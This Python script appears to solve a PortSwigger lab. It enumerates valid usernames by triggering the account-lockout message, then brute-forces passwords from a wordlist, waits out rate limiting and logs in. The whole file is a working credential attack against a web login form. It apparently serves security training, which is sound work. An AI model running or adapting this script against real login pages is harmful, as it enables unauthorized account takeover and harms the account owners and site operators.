import sys
import requests
import random
import time

def load_list(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def try_username(burp_url, username):
    for _ in range(5):
        password = f"aaa{random.randint(1, 1000)}"
        response = requests.post(burp_url, data={'username': username, 'password': password})
        if "You have made too many incorrect login attempts." in response.text:
            return True
    return False

def try_passwords(burp_url, username, password_list):
    for password in password_list:
        response = requests.post(burp_url, data={'username': username, 'password': password})
        if ("You have made too many incorrect login attempts" not in response.text and
                "Invalid username or password" not in response.text):
            print(f"Found correct password for {username}: {password}")
            print("Pausing for 61 seconds before logging in to avoid rate limiting.")
            time.sleep(61)
            login_response = requests.post(burp_url, data={'username': username, 'password': password})
            if login_response.status_code == 200:
                print("Successfully logged in!")
            else:
                print("Failed to log in after waiting.")
            return True
    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

    burp_url = sys.argv[1] + '/login'
    username_list = load_list('../Portswigger_lists/username_list.txt')
    password_list = load_list('../Portswigger_lists/password_list.txt')

    for username in username_list:
        if try_username(burp_url, username):
            print(f"Found correct username: {username}")
            if try_passwords(burp_url, username, password_list):
                break
            else:
                print(f"Failed to find password for {username}")
